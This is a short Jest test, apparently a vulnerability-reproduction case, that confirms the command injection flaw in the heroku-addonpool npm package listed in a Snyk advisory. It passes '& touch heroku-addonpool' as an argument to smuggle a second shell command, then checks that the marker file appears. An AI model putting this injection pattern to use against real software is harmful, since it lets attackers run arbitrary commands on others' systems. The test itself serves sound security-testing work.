//https://snyk.io/vuln/SNYK-JS-HEROKUADDONPOOL-564428
test("Command Injection in heroku-addonpool", () => {
  const Root = require("heroku-addonpool");
  const fs = require("fs");
  const path = "./heroku-addonpool";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let root = Root("sss", "& touch heroku-addonpool", {});
  root.setup();
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
